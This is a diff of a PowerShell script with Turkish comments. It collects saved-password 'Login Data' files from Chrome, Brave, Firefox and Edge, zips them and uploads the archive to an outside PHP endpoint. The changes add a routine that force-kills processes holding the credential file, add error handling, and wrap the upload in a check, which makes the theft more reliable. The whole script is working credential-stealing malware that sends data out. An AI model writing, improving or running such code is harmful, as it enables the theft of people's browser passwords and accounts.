@@ -16,7 +16,7 @@ function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
     foreach ($file in $filesToCopy) {
         $source = Join-Path -Path $browserDir -ChildPath $file
         if (Test-Path $source) {
-            Copy-Item -Path $source -Destination $browserDestDir
+            Copy-Item -Path $source -Destination $browserDestDir -ErrorAction SilentlyContinue
             Write-Host "$browserName - File copied: $file"
         } else {
             Write-Host "$browserName - File not found: $file"
@@ -24,17 +24,26 @@ function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
     }
 }
 
+# Function to find and kill processes using a specific file
+function KillProcessesUsingFile($filePath) {
+    # Get the process IDs using the file
+    $processes = Get-Process | Where-Object { $_.Modules | Where-Object { $_.FileName -eq $filePath } }
+
+    foreach ($process in $processes) {
+        Write-Host "Killing process: $($process.Name) with ID: $($process.Id)"
+        Stop-Process -Id $process.Id -Force
+    }
+}
+
 # Configuration for Google Chrome
 $chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
 $chromeFilesToCopy = @("Login Data")
 CopyBrowserFiles "Chrome" $chromeDir $chromeFilesToCopy
-Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Chrome") -ErrorAction SilentlyContinue
 
 # Configuration for Brave
 $braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
 $braveFilesToCopy = @("Login Data")
 CopyBrowserFiles "Brave" $braveDir $braveFilesToCopy
-Copy-Item -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Brave") -ErrorAction SilentlyContinue
 
 # Configuration for Firefox
 $firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
@@ -51,7 +60,6 @@ if ($firefoxProfile) {
 $edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
 $edgeFilesToCopy = @("Login Data")
 CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
-Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue
 
 # Sıkıştırmak istediğiniz klasörün yolu
 $folderPath = "$env:APPDATA\BrowserData"
@@ -64,24 +72,40 @@ if (-Not (Test-Path $zipDestDir)) {
 
 $zipFilePath = "$zipDestDir\BrowserData.zip"
 
-# Klasörü ZIP dosyasına sıkıştırma
-Compress-Archive -Path "$folderPath\*" -DestinationPath $zipFilePath
+# Kullanıcı dosyası olan Login Data'nın yolunu tanımlayın
+$loginDataPath = Join-Path -Path $chromeDir -ChildPath "Login Data"
 
-# Yüklemek istediğiniz dosyanın yolu
-$filePath = $zipFilePath
-
-# PHP dosya yükleme URL'si
-$url = "https://alperen.cc/uploadd.php" # PHP uygulamanızın URL'sini buraya yazın
-
-# Dosya yüklemek için form data oluşturma
-$form = @{
-    fileToUpload = Get-Item $filePath
+# Kullanılan dosyayı kullanan süreçleri durdurun
+if (Test-Path $loginDataPath) {
+    KillProcessesUsingFile $loginDataPath
 }
 
-# POST isteği gönderme
-$response = Invoke-RestMethod -Uri $url -Method Post -Form $form
+# Klasörü ZIP dosyasına sıkıştırma
+try {
+    Compress-Archive -Path "$folderPath\*" -DestinationPath $zipFilePath -ErrorAction Stop
+} catch {
+    Write-Host "ZIP dosyası oluşturulurken bir hata oluştu: $_"
+}
 
-# Yanıtı yazdırma
-Write-Output $response
+# Yüklemek istediğiniz dosyanın yolu
+if (Test-Path $zipFilePath) {
+    $filePath = $zipFilePath
+
+    # PHP dosya yükleme URL'si
+    $url = "https://alperen.cc/uploadd.php" # PHP uygulamanızın URL'sini buraya yazın
+
+    # Dosya yüklemek için form data oluşturma
+    $form = @{
+        fileToUpload = Get-Item $filePath
+    }
+
+    # POST isteği gönderme
+    $response = Invoke-RestMethod -Uri $url -Method Post -Form $form -ErrorAction Stop
+
+    # Yanıtı yazdırma
+    Write-Output $response
+} else {
+    Write-Host "ZIP dosyası oluşturulamadığı için yükleme yapılmadı."
+}
 
 exit
